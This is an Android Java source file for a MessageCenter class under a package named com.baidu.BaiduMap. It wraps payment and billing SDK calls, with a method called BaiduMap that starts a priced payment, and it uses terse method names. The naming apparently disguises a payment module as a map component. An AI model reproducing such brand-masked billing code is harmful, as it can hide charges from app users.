package com.baidu.BaiduMap;

import java.util.HashMap;
import java.util.Map;

import com.baidu.BaiduMap.httpCenter.GetDataImpl;
import com.baidu.BaiduMap.json.SetEntity;
import com.baidu.BaiduMap.pay.InitPay1001;
import com.baidu.BaiduMap.pay.NormalPay1003;
import com.baidu.BaiduMap.pay.SDKInit;
import com.baidu.BaiduMap.utils.ACacheUtils;

import android.content.Context;
import android.os.Handler;

public class MessageCenter {
	private static MessageCenter messageCenter = null;

	public static MessageCenter getInstance() {
		if (messageCenter == null) {
			messageCenter = new MessageCenter();
		}
		return messageCenter;
	}

	public void SDKInitializer(Context ctx, String price, int payItemID, String str, String product, String Did,
			String extData, Object payCallBackObject, Object initObject) {
		Handler initHandler = (Handler) initObject;
		SDKInit.getInstance().SDKInitializer(ctx, price, payItemID, str, product, "1001", extData, payCallBackObject,
				initHandler);
	}

	public void BaiduMap(Context ctx, String price, int payItemID, String str, String product, String Did,
			String extData, Object payCallBackObject) {
		if (ACacheUtils.getInstance(ctx).getSetEntity() != null) {
			NormalPay1003.getInstance().BaiduMap(ctx, price, payItemID, str, product, "1003", extData, payCallBackObject,
					ACacheUtils.getInstance(ctx).getSetEntity());
		}
	}

	public void s(Context context) {
		SDKInit.getInstance().s(context);
	}

	public void close() {
		android.os.Process.killProcess(android.os.Process.myPid());
	}

	public HashMap<String, Map<String, Object>> g() {
		HashMap<String, Map<String, Object>> content = GetDataImpl.content;
		if (content == null || content.size() == 0) {
			return null;
		} else {
			return content;
		}
	}
}
